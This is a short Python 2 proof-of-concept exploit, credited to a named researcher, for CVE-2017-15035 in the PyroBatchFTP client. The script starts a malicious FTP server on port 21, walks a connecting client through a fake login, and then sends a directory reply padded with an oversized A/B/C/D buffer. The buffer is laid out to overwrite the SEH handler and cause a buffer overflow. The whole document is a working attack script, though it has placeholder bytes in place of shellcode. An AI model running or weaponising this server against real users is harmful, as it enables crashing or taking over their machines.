#!/usr/bin/python
  
print "PyroBatchFTP Local Buffer Overflow (SEH) Server"

#Author: Kevin McGuigan @_h3xagram
#Author Website: https://www.7elements.co.uk
#Vendor Website: https://www.emtech.com
#Date: 07/10/2017
#Version: 3.17
#Tested on: Windows 7 32-bit
#CVE: CVE-2017-15035

 
import socket
import sys

buffer="A" * 2292 +   "B" * 4 + "C" * 4 + "D" * 800
port = 21
 
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[+] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[+] Failed to bind the server to port: "+str(port)+"\r\n")
 
while True:
    conn, addr = s.accept()
    conn.send('220 Welcome to PyoBatchFTP Overflow!\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+buffer+'" is current directory\r\n')